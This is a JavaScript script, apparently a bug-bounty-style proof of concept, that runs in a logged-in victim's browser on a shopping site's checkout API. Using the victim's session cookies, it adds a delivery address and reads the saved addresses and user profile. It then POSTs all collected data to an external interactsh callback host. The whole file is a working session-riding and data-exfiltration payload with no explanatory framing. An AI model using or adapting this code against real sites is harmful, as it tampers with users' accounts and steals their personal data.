const EXFIL_URL = "http://d7cdv6n1tt70g8jvhdl0nhntcih8gg1c4.interactsh-server.meeshogcp.in/";

function randomPhone() {
  return Math.floor(1000000000 + Math.random() * 9000000000).toString();
}

function sendToServer(data) {
  return fetch(EXFIL_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data)
  });
}

const phone = randomPhone();
const results = { phone };

fetch("/mcheckout/api/2.0/addresses", {
  method: "POST",
  credentials: "include",
  headers: {
    "Content-Type": "application/json",
    "Accept": "application/json"
  },
  body: JSON.stringify({
    address_line_1: "219, Natraj Market, S V Rd, Malad (e)",
    address_line_2: "219, Natraj Market, S V Rd, Malad (e)",
    address_type: "Home",
    city: "Mumbai",
    landmark: "",
    mobile: phone,
    name: "hihi",
    state: "Maharashtra",
    check_pin: true,
    country_id: 1,
    is_invalid_edit: false,
    pin: "400097",
    user_id: 534170266
  })
})
.then(res => res.text())
.then(postData => {
  results.createAddress = postData;

  return fetch("/mcheckout/api/3.0/addresses", {
    method: "GET",
    credentials: "include",
    headers: { "Accept": "application/json" }
  });
})
.then(res => res.text())
.then(addressData => {
  results.addresses = addressData;

  return fetch("/api/v1/user_profile", {
    method: "GET",
    credentials: "include",
    headers: { "Accept": "application/json" }
  });
})
.then(res => res.text())
.then(profileData => {
  results.userProfile = profileData;

  return sendToServer(results);
})
.then(() => console.log("Data sent to server"))
.catch(err => console.error("Error:", err));
